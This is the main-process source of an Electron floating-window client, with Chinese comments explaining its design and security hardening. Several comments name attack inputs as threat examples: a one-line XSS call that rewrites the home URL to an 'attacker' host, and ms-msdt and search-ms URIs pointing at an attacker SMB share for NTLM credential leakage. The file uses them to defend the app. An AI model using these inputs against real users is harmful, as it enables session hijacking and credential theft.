// 浮動客戶端的主行程。
//
// 【為什麼需要一個原生殼】需求是「真半透明 + 永遠置頂 + 完整可操作」。瀏覽器沒有
// 任何 API 能讓網頁把自己的視窗變透明(Document PiP 也不行,最多把內容調暗),擴充
// 也拿不到置頂。而「用外部工具去改瀏覽器視窗的 alpha」在 macOS 沒有公開 API。
// 使用者三個平台都用,所以只能自己擁有視窗 —— 見 docs/superpowers/specs 的設計文件。
//
// 【為什麼不用 setOpacity()】那個 API 只支援 Windows 與 macOS。改用
// transparent:true(視窗背景真的透出桌面)+ 頁面注入 CSS opacity,三平台同一條路。
const { app, BrowserWindow, ipcMain, globalShortcut, shell, screen } = require("electron");
const path = require("path");
const fs = require("fs");
const S = require("./settings");
const { allowNavigation } = require("./urlguard");
const { nextAlpha, accelerators } = require("./shortcuts");

// Wayland 沒有讓客戶端自己要求置頂的協議,setAlwaysOnTop 會是無效呼叫;X11 才有
// _NET_WM_STATE_ABOVE。Ubuntu 22.04 之後預設 Wayland,而本視窗無邊框、沒有標題列
// 可以右鍵手動設定置頂,所以強制走 XWayland 取得 X11 語意。
if (process.platform === "linux") {
  app.commandLine.appendSwitch("ozone-platform", "x11");
}

const CFG = () => path.join(app.getPath("userData"), "settings.json");
let cfg = S.merge({});
let win = null;

// 使用者看得見的提示。快速鍵註冊失敗、設定存檔失敗這類事,以前只有 console.error
// —— 打包後的 exe 是 GUI 程式沒有主控台,那些訊息去到不存在的地方。改成把訊息存
// 在這裡,控制條的 ⚠ 鈕透過 fc:get 拿到後用 alert() 顯示(見 overlay.js)。
const notices = [];

function load() {
  try { cfg = S.merge(JSON.parse(fs.readFileSync(CFG(), "utf8"))); }
  catch (_) { cfg = S.merge({}); }      // 檔案不存在或壞掉 → 用預設值,不要當掉
}

function save() {
  try {
    fs.mkdirSync(path.dirname(CFG()), { recursive: true });
    fs.writeFileSync(CFG(), JSON.stringify(cfg, null, 2), "utf8");
  } catch (e) {
    console.error("設定存檔失敗", e);
    notices.push(`設定存檔失敗:${e.message || e} —— 這次的變更(網址/透明度/視窗位置等)可能在重開後消失。`);
  }
}

// 【為什麼要 debounce】拖曳把手是這個視窗唯一的移動方式,resize/move 事件一拖就是
// 幾十到上百次,若每次都同步 writeFileSync:(a) 主行程被同步 I/O 卡住,視窗跟手
// 不順,而那正是產品核心互動;(b) 密集覆寫途中程式被砍,settings.json 可能截斷,
// load() 會靜默 fallback 到預設值 —— 使用者存好的網址就這樣消失,且完全不知道
// 為什麼。改成 400ms 內的多次呼叫只留最後一次,並在關閉/結束時強制 flush 一次,
// 確保視窗真的關掉前該存的一定存到。
let saveTimer = null;
function saveSoon() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => { saveTimer = null; save(); }, 400);
}
function flushSave() {
  if (saveTimer) { clearTimeout(saveTimer); saveTimer = null; }
  save();
}

// 只有【我們自己的頁面】能呼叫這些會動到「首頁網址」或「跳去設定頁」的 IPC:
// setup.html(file:)與載入失敗時 Electron 顯示的內建錯誤頁(chrome-error:)。
// 遠端頁面若有 XSS,一行 window.fc.setUrl("http://attacker/") 就能把首頁永久換成
// 攻擊者的站,而它長得就像使用者自己的應用程式(無邊框/置頂/半透明)—— 拿 token
// 易如反掌,此後每次開程式都載入攻擊者頁面。
function _fromOwnPage(event) {
  const u = (event && event.senderFrame && event.senderFrame.url) || "";
  return u.startsWith("file://") || u.startsWith("chrome-error://");
}
// openSettings 本身不改 cfg.url(只是把視窗導去 setup.html),真正的持久性風險全部
// 集中在 setUrl,所以不需要跟 setUrl 一樣嚴格。控制條的 ⚙ 鈕就掛在目前載入的遠端
// 頁面上(overlay.js 只在 cfg.url 有值時才 mount),若比照 setUrl 只准 file/
// chrome-error 呼叫,⚙ 鈕會連自己人都打不開;而且該頁面既然拿得到 window.fc,
// 就算擋掉這支 IPC 也擋不住它用 location.href 自己導頁,擋這支 IPC 對它已有的
// 能力沒有實質差別。所以這裡多放行「目前這個視窗本來就信任、載入中的那個
// origin」,只有跟目前 cfg.url 不同來源(表示不是這次載入的這個頁面在呼叫,
// 而是被塞進了別的東西)才擋。
function _canOpenSettings(event) {
  if (_fromOwnPage(event)) return true;
  const u = (event && event.senderFrame && event.senderFrame.url) || "";
  const home = S.originOf(cfg.url);
  return !!home && u.startsWith(home);
}

// 錯誤頁要把 desc/url 內插進 innerHTML,必須先跳脫 —— 外層的 JSON.stringify 只保證
// 整段作為 JS 字串字面量安全,不會跳脫 < > " 這些 HTML 特殊字元。而這個頁面上下文
// 暴露著 window.fc,注入進去的腳本可以直接呼叫它。
const esc = s => String(s).replace(/[&<>"']/g, c =>
  ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

function applyAlpha() {
  if (!win) return;
  // 套在 html 而不是 body:body 可能被頁面設了背景色,套在 html 才能讓視窗背景
  // 的透明真的透出來。!important 是因為頁面自己也可能設 opacity。
  win.webContents.insertCSS(`html{opacity:${cfg.alpha} !important}`)
     .catch(() => {});
}

function applyTopmost() {
  if (!win) return;
  win.setAlwaysOnTop(cfg.topmost, cfg.topLevel);
}

function createWindow() {
  // 存下來的視窗位置可能是「外接螢幕拔掉前」的座標(例如 bounds.x = 2560)。
  // 這種視窗建在畫面外:無邊框沒有標題列可拖、看不到任何東西、也沒有任何錯誤
  // 訊息,看起來就是程式壞了。screen 模組只能在 app.whenReady() 之後用,
  // createWindow() 保證晚於它,所以這裡呼叫是安全的。
  if (cfg.bounds) {
    const displays = screen.getAllDisplays().map(d => d.workArea);
    if (!S.boundsOnAnyDisplay(cfg.bounds, displays)) {
      notices.push(
        `上次的視窗位置(${cfg.bounds.x}, ${cfg.bounds.y})已不在目前任何螢幕範圍內` +
        `(可能是換了/拔掉了外接螢幕),已重設為預設位置與大小。`);
      cfg.bounds = null;
      saveSoon();
    }
  }
  const b = cfg.bounds || {};
  win = new BrowserWindow({
    width: b.width || 960, height: b.height || 600,
    x: b.x, y: b.y,
    transparent: true, frame: false, resizable: true,
    backgroundColor: "#00000000",
    webPreferences: {
      preload: path.join(__dirname, "preload.js"),
      contextIsolation: true, nodeIntegration: false,
      // 沙盒化的 preload(Electron 20 起預設)只准 require 白名單內的內建模組,
      // 連 require("./overlay") 這種本機相對路徑都會直接載入失敗(靜默不掛控制條,
      // 只有主控台看得到 "module not found")。關掉 sandbox 讓 preload 能用完整
      // Node API,contextIsolation 仍然擋著,頁面本身還是只看得到 contextBridge
      // 曝露的 window.fc,不會多拿到 require/ipcRenderer。
      sandbox: false,
    },
  });
  applyTopmost();

  // 外部連結交給系統瀏覽器,不要讓這個置頂視窗變成通用瀏覽器。
  // 【scheme 一定要先過濾】openExternal 會把 URL 原封不動交給作業系統處理 ——
  // 實測 ms-msdt:...(Follina 遠端執行入口)與 search-ms:...location:\\attacker\share
  // (誘導開啟遠端 SMB 資料夾、經典的 NTLM 憑證外洩手法)都會走進這個 handler。
  // 只有 S.normalizeUrl() 判定為合法 http/https 才丟給系統瀏覽器,其餘一律丟棄。
  win.webContents.setWindowOpenHandler(({ url }) => {
    if (!allowNavigation(url, cfg.url)) {
      if (S.normalizeUrl(url)) shell.openExternal(url);
      return { action: "deny" };
    }
    return { action: "allow" };
  });
  // will-navigate 只擋得住「頁面內導覽」。伺服器端的 302 轉址不算頁面內導覽 ——
  // 實測:頁面導去同 origin(通過白名單)→ 伺服器 302 到別的 origin →
  // will-redirect 沒人攔 → 最終落點還是變成外站,白名單形同虛設。兩個事件用
  // 完全相同的判斷,轉址才會被同樣的規則擋住。
  const guardNav = (e, url) => { if (!allowNavigation(url, cfg.url)) e.preventDefault(); };
  win.webContents.on("will-navigate", guardNav);
  win.webContents.on("will-redirect", guardNav);
  // 憑證錯誤【不自動忽略】—— 那等於把 https 的意義丟掉。讓它照常失敗並顯示錯誤頁。
  win.webContents.on("did-fail-load", (_e, code, desc, url, isMainFrame) => {
    if (code === -3) return;                       // ERR_ABORTED,使用者自己取消
    // 子資源(圖片/script/iframe)失敗也會觸發這個事件,不擋的話遠端頁面壞一張圖
    // 就會被錯誤頁整頁蓋掉 —— 那正是 spec 說「不要白畫面」要避免的。
    if (!isMainFrame) return;
    win.webContents.executeJavaScript(
      `document.body.innerHTML=${JSON.stringify(
        `<div style="height:100vh;display:flex;flex-direction:column;gap:10px;` +
        `align-items:center;justify-content:center;background:#12151c;color:#e6e8ee;` +
        `font:14px system-ui,'Microsoft JhengHei',sans-serif;-webkit-app-region:drag">` +
        `<div style="font-size:16px">連不上遠端</div>` +
        `<div style="color:#8a8f99;font-size:12px">${esc(desc)} (${code})</div>` +
        `<div style="color:#8a8f99;font-size:12px">${esc(url)}</div>` +
        `<button style="-webkit-app-region:no-drag;padding:8px 18px;border-radius:8px;` +
        `border:1px solid #3a4150;background:#1b1f28;color:#e6e8ee;cursor:pointer" ` +
        `onclick="window.fc.reload()">重試</button>` +
        `<button style="-webkit-app-region:no-drag;padding:8px 18px;border-radius:8px;` +
        `border:1px solid #3a4150;background:#1b1f28;color:#e6e8ee;cursor:pointer" ` +
        `onclick="window.fc.openSettings()">改設定</button></div>`)}`
    ).catch(() => {});
  });
  win.webContents.on("did-finish-load", applyAlpha);

  // 拖曳把手是這個視窗唯一的移動方式,拖一次會連續觸發幾十到上百次 resize/move ——
  // 用 saveSoon() 而不是 save(),理由見 saveSoon 定義處的註解。
  const remember = () => {
    if (!win || win.isDestroyed()) return;
    cfg.bounds = S.merge({ bounds: win.getBounds() }).bounds;
    saveSoon();
  };
  win.on("resize", remember);
  win.on("move", remember);
  // "close" 在視窗真的被摧毀前觸發,這時 win 還能安全呼叫 getBounds();
  // 在這裡強制 flush 一次,確保拖到最後一刻的視窗位置不會因為 debounce 還沒到期
  // 就被跳過存檔。
  win.on("close", () => {
    if (win && !win.isDestroyed()) cfg.bounds = S.merge({ bounds: win.getBounds() }).bounds;
    flushSave();
  });
  win.on("closed", () => { win = null; });

  go();
}

function go() {
  if (!win) return;
  if (cfg.url) win.loadURL(cfg.url);
  else win.loadFile(path.join(__dirname, "setup.html"));
}

// ---- IPC ----
// notices 隨 fc:get 一起回傳,是控制條 ⚠ 鈕的資料來源(見 overlay.js)。
ipcMain.handle("fc:get", () => ({ ...cfg, platform: process.platform, notices }));
// alpha 會隨滑桿 input 事件高頻觸發,跟 bounds 一樣用 saveSoon()。
ipcMain.handle("fc:alpha", (_e, v) => {
  cfg.alpha = S.clampAlpha(v); saveSoon(); applyAlpha(); return cfg.alpha;
});
ipcMain.handle("fc:topmost", (_e, on) => {
  cfg.topmost = !!on; save(); applyTopmost(); return cfg.topmost;
});
ipcMain.handle("fc:overlay", (_e, on) => { cfg.overlay = !!on; save(); return cfg.overlay; });
ipcMain.handle("fc:setUrl", (e, s) => {
  if (!_fromOwnPage(e)) {
    notices.push("已擋下一次來源不明(非設定頁/連線失敗頁)呼叫 setUrl 的請求 —— " +
      "首頁網址未被更動。若你沒有做任何設定操作,遠端頁面可能被注入了非預期的內容。");
    return { ok: false, denied: true };
  }
  const n = S.normalizeUrl(s);
  if (s !== "" && !n) return { ok: false };
  cfg.url = n || ""; save(); go(); return { ok: true };
});
ipcMain.handle("fc:reload", () => { go(); });
// 存過網址後,原本唯一回設定頁的路徑是「連線失敗的錯誤頁」——若打錯的 port 剛好
// 有別的東西在回應 200(連得上,但不是我們要連的服務),就永遠回不去,只能手改
// settings.json。這支 IPC 補上這條路,控制條的 ⚙ 鈕與錯誤頁的「改設定」鈕都靠它。
// 【刻意不清 cfg.url】設定頁會把它預填回輸入框,方便使用者只是想換 port 之類的
// 小改動,而不必重新整個網址打一遍。
ipcMain.handle("fc:openSettings", (e) => {
  if (!_canOpenSettings(e)) {
    notices.push("已擋下一次來源不明呼叫 openSettings 的請求。");
    return { ok: false, denied: true };
  }
  if (win) win.loadFile(path.join(__dirname, "setup.html"));
  return { ok: true };
});

app.whenReady().then(() => {
  load();

  // spec 的錯誤處理表要求「Linux 無合成器導致透明失效時提示改用不透明模式」,但
  // 真正偵測合成器是否存在需要原生探測(讀 X11/Wayland 的合成擴充狀態),Electron
  // 沒有跨平台 API 做這件事,不可行。這裡改用等價而誠實的方式:啟動時就先給一條
  // 說明,把「判斷有沒有合成器」交還給使用者的眼睛 —— Ubuntu 預設的 GNOME Shell
  // (mutter)本身就是合成器,正常情況不需要額外裝什麼;如果看到的是純黑背景而
  // 不是透出桌面,才代表環境沒有合成器。這是「提示」不是「自動偵測」,說清楚
  // 是為了不要讓人誤以為程式真的檢查過了。
  if (process.platform === "linux") {
    notices.push(
      "Linux 透明度提示(非自動偵測,原生偵測合成器不可行):真半透明需要桌面" +
      "合成器,Ubuntu 預設的 GNOME Shell(mutter)本身就是,通常不需要額外安裝。" +
      "若視窗背景是純黑而不是透出桌面,代表目前環境沒有合成器,請改用不透明模式" +
      "(把 alpha 設回 1.0)。");
  }

  createWindow();

  // 控制條可以收起,收起後只靠快速鍵操作,所以註冊失敗要讓使用者知道
  // (通常是被其他程式佔用),不能靜默。
  const acc = accelerators(process.platform);
  const failed = [];
  const reg = (key, fn) => { if (!globalShortcut.register(key, fn)) failed.push(key); };
  reg(acc.alphaDown, () => { cfg.alpha = nextAlpha(cfg.alpha, -1); save(); applyAlpha(); });
  reg(acc.alphaUp,   () => { cfg.alpha = nextAlpha(cfg.alpha, +1); save(); applyAlpha(); });
  reg(acc.topmost,   () => { cfg.topmost = !cfg.topmost; save(); applyTopmost(); });
  reg(acc.overlay,   () => {
    cfg.overlay = !cfg.overlay; save();
    if (win) win.webContents.executeJavaScript(
      `(()=>{const b=document.getElementById("fcBar");if(b)b.style.display=` +
      `${cfg.overlay ? '""' : '"none"'};})()`).catch(() => {});
  });
  if (failed.length) {
    // 內容要具體:使用者按 ▾ 收起控制條後,快速鍵是唯一能叫回它的方式 —— 若那組
    // 快速鍵剛好也在失敗名單裡,控制條會再也叫不回來,看起來就像程式壞了。具體
    // 列出哪幾組失敗、可能被什麼類型的程式佔用,使用者才有機會自己排除。
    const msg = `以下快速鍵註冊失敗(可能被螢幕截圖工具、輸入法、其他常駐程式佔用):` +
      `${failed.join(", ")}。若剛好是「顯示/收起控制條」那一組失敗,且控制條目前` +
      `是收起狀態,將無法用快速鍵叫回,請改用重開程式或直接編輯 settings.json 的 ` +
      `"overlay" 欄位。`;
    console.error(msg);
    notices.push(msg);
  }
});
app.on("window-all-closed", () => app.quit());
app.on("will-quit", () => { flushSave(); globalShortcut.unregisterAll(); });
